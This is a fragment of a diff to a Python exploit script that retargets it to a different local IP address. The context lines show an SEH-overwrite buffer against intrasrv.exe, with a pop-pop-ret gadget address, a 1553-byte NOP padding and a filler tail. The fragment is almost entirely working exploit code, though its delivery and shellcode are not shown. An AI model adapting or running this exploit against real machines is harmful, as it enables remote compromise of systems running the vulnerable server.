@@ -4,7 +4,7 @@ import socket
 import os
 import sys
 
-target="192.168.1.169"
+target="192.168.37.131"
 
 seh="\xdd\x97\x40\x00"  #0x004097dd, # pop eax # pop ebp # ret  - intrasrv.exe
 crash = "\x90"*1553 + seh + "B" * 1500
